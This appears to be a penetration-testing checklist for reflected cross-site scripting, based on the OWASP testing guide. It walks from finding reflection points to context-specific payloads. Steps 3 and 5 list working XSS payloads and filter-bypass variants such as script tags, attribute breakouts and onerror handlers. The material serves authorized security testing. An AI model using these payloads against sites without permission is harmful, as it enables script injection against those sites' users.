# OWASP WSTG-INPV-01: Reflected XSS Testing

Reference: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting

## Step 1 — Identify reflection points

For each parameter, send a unique canary: `clinkzRXSS<unique_id>`
Search the response body for the canary. If found = input is reflected.

## Step 2 — Determine reflection context

Look at the HTML around your canary:

a) HTML body: `<p>clinkzRXSS123</p>` → inject HTML tags
b) HTML attribute: `value='clinkzRXSS123'` → break out of attribute
c) JavaScript: `var x='clinkzRXSS123'` → break out of string
d) URL context: `href='clinkzRXSS123'` → javascript: protocol

## Step 3 — Test context-appropriate payload

Context a: `<script>alert(1)</script>`
Context b: `'><script>alert(1)</script>` OR `' autofocus onfocus=alert(1) x='`
Context c: `';alert(1)//` OR `'-alert(1)-'`
Context d: `javascript:alert(1)`

## Step 4 — If filtered, identify the filter

Send: `<script>` — was it removed? encoded?
Send: `<img` — was it removed?
Send: `alert` — was it removed?

Narrow down EXACTLY what the filter blocks.

## Step 5 — Bypass the specific filter

- `<script>` blocked → use `<img src=x onerror=alert(1)>`
- `alert` blocked → use `prompt(1)` or `confirm(1)`
- `<` blocked → if in JS context, use `'-alert(1)-'`
- All tags blocked → check if event handlers work in existing tags

## Step 6 — Document with exact request showing XSS in response
